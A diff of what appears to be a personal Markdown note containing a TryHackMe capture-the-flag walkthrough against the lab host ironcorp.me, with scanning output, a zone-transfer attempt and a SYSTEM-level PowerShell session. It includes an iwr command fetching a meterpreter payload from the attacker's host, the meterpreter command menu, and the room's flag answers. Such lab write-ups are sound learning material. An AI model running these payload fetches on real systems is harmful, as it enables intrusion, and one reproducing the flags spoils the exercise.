@@ -40,8 +40,6 @@ https://github.com/hash3liZer/Subrake
 /usr/lib/python3/dist-packages/requests/__init__.py:109: RequestsDependencyWarning: urllib3 (1.26.12) or chardet (None)/charset_normalizer (3.0.1) doesn't match a supported version!
   warnings.warn(
 
-
-
   ██████  █    ██  ▄▄▄▄   ▄▄▄█████▓ ▄▄▄       ██▓███
 ▒██    ▒  ██  ▓██▒▓█████▄ ▓  ██▒ ▓▒▒████▄    ▓██░  ██▒
 ░ ▓██▄   ▓██  ▒██░▒██▒ ▄██▒ ▓██░ ▒░▒██  ▀█▄  ▓██░ ██▓▒
@@ -80,7 +78,6 @@ Options:
                         Helpful in removing False Positives          NONE
        --version        Show version                                 NONE
 
-
 https://github.com/erforschr/bruteforce-http-auth
 
 ┌──(witty㉿kali)-[~/Downloads/bruteforce-http-auth]
@@ -94,7 +91,6 @@ https://github.com/erforschr/bruteforce-http-auth
 usage: bruteforce-http-auth.py [-h] (-t TARGET | -T TARGETFILE) (-u USERNAME | -U USERNAMESFILE)
                                [-p PASSWORD | -P PASSWORDSFILE] [-w WORKERS] [-o ORDER] [-v]
 bruteforce-http-auth.py: error: one of the arguments -t/--target -T/--targetfile is required
-
 
 ┌──(witty㉿kali)-[~/Downloads/bruteforce-http-auth]
 └─$ rustscan -a ironcorp.me --ulimit 5500 -b 65535 -- -A -Pn
@@ -240,8 +236,6 @@ Nmap done: 1 IP address (1 host up) scanned in 73.59 seconds
 /usr/lib/python3/dist-packages/requests/__init__.py:109: RequestsDependencyWarning: urllib3 (1.26.12) or chardet (None)/charset_normalizer (3.0.1) doesn't match a supported version!
   warnings.warn(
 
-
-
   ██████  █    ██  ▄▄▄▄   ▄▄▄█████▓ ▄▄▄       ██▓███
 ▒██    ▒  ██  ▓██▒▓█████▄ ▓  ██▒ ▓▒▒████▄    ▓██░  ██▒
 ░ ▓██▄   ▓██  ▒██░▒██▒ ▄██▒ ▓██░ ▒░▒██  ▀█▄  ▓██░ ██▓▒
@@ -300,7 +294,6 @@ Nmap done: 1 IP address (1 host up) scanned in 73.59 seconds
 ; <<>> DiG 9.18.12-1-Debian <<>> axfr ironcorp.me
 ;; global options: +cmd
 ; Transfer failed.
-
 
 ┌──(witty㉿kali)-[~/Downloads/Subrake]
 └─$ dig axfr ironcorp.me @10.10.76.56
@@ -438,9 +431,7 @@ nt authority\system
 PS E:\xampp\htdocs\internal> cd c:\users
 PS C:\users> ls
 
-
     Directory: C:\users
-
 
 Mode                LastWriteTime         Length Name                          
 ----                -------------         ------ ----                          
@@ -452,13 +443,10 @@ d-----        4/11/2020  11:56 AM                Sunlight
 d-----        4/11/2020  11:53 AM                SuperAdmin                    
 d-----        4/11/2020   3:00 AM                TEMP                          
 
-
 PS C:\users> cd Administrator
 PS C:\users\Administrator> ls
 
-
     Directory: C:\users\Administrator
-
 
 Mode                LastWriteTime         Length Name                          
 ----                -------------         ------ ----                          
@@ -474,27 +462,21 @@ d-r---        4/12/2020   1:27 AM                Saved Games
 d-r---        4/12/2020   1:27 AM                Searches                      
 d-r---        4/12/2020   1:27 AM                Videos                        
 
-
 PS C:\users\Administrator> cd Desktop
 PS C:\users\Administrator\Desktop> ls
 
-
     Directory: C:\users\Administrator\Desktop
-
 
 Mode                LastWriteTime         Length Name                          
 ----                -------------         ------ ----                          
 -a----        3/28/2020  12:39 PM             37 user.txt                      
-
 
 PS C:\users\Administrator\Desktop> cat user.txt
 thm{09b408056a13fc222f33e6e4cf599f8c}
 
 PS C:\users\Equinox\Desktop> dir -force
 
-
     Directory: C:\users\Equinox\Desktop
-
 
 Mode                LastWriteTime         Length Name                          
 ----                -------------         ------ ----                          
@@ -525,17 +507,13 @@ thm{a1f936a086b367761cc4e7dd6cd2e2bd}
 
 PS C:\users\SuperAdmin> get-acl C:\users\SuperAdmin
 
-
     Directory: C:\users
-
 
 Path       Owner               Access                                          
 ----       -----               ------                                          
 SuperAdmin NT AUTHORITY\SYSTEM BUILTIN\Administrators Deny  FullControl...     
 
-
 PS C:\users\SuperAdmin> get-acl C:\users\SuperAdmin |fl
-
 
 Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\SuperAdmin
 Owner  : NT AUTHORITY\SYSTEM
@@ -562,7 +540,6 @@ Payload size: 510 bytes
 Final size of psh file: 3266 bytes
 Saved as: meterpreter-64.ps1
 
-
 PS C:\users\SuperAdmin> powershell -command "& { iwr 10.8.19.103/meterpreter-64.ps1 -OutFile C:\Users\Administrator\Desktop\meterpreter-64.ps1 }"
 
 ┌──(witty㉿kali)-[~/Downloads]
@@ -573,9 +550,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 PS C:\users\SuperAdmin> cd C:\Users\Administrator\Desktop\
 PS C:\Users\Administrator\Desktop> ls
 
-
     Directory: C:\Users\Administrator\Desktop
-
 
 Mode                LastWriteTime         Length Name                          
 ----                -------------         ------ ----                          
@@ -604,7 +579,6 @@ PS C:\Users\Administrator\Desktop> Import-Module .\meterpreter-64.ps1
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-
 
        =[ metasploit v6.3.4-dev                           ]
 + -- --=[ 2294 exploits - 1200 auxiliary - 409 post       ]
@@ -712,7 +686,6 @@ Core Commands
     uuid          Get the UUID for the current session
     write         Writes data to a channel
 
-
 Stdapi: File system Commands
 ============================
 
@@ -742,7 +715,6 @@ Stdapi: File system Commands
     show_mount    List all mount points/logical drives
     upload        Upload a file or directory
 
-
 Stdapi: Networking Commands
 ===========================
 
@@ -756,7 +728,6 @@ Stdapi: Networking Commands
     portfwd       Forward a local port to a remote service
     resolve       Resolve a set of host names on the target
     route         View and modify the routing table
-
 
 Stdapi: System Commands
 =======================
@@ -785,7 +756,6 @@ Stdapi: System Commands
     suspend       Suspends or resumes a list of processes
     sysinfo       Gets information about the remote system, such as OS
 
-
 Stdapi: User interface Commands
 ===============================
 
@@ -807,7 +777,6 @@ Stdapi: User interface Commands
     setdesktop    Change the meterpreters current desktop
     uictl         Control some of the user interface components
 
-
 Stdapi: Webcam Commands
 =======================
 
@@ -820,14 +789,12 @@ Stdapi: Webcam Commands
     webcam_strea  Play a video stream from the specified webcam
     m
 
-
 Stdapi: Audio Output Commands
 =============================
 
     Command       Description
     -------       -----------
     play          play a waveform audio file (.wav) on the target system
-
 
 Priv: Elevate Commands
 ======================
@@ -836,7 +803,6 @@ Priv: Elevate Commands
     -------       -----------
     getsystem     Attempt to elevate your privilege to that of local system.
 
-
 Priv: Password database Commands
 ================================
 
@@ -844,14 +810,12 @@ Priv: Password database Commands
     -------       -----------
     hashdump      Dumps the contents of the SAM database
 
-
 Priv: Timestomp Commands
 ========================
 
     Command       Description
     -------       -----------
     timestomp     Manipulate file MACE attributes
-
 
 Incognito Commands
 ==================
@@ -912,11 +876,7 @@ E:\xampp\htdocs\internal>type C:\Users\Admin\Desktop\root.txt
 type C:\Users\Admin\Desktop\root.txt
 thm{a1f936a086b367761cc4e7dd6cd2e2bd}
 
-
 ```
-
-
-![[Pasted image 20230722161811.png]]
 
 user.txt  
 
@@ -925,8 +885,5 @@ user.txt
 root.txt 
 
 *thm{a1f936a086b367761cc4e7dd6cd2e2bd}*
-
-
-
 
 [[Fusion Corp]]
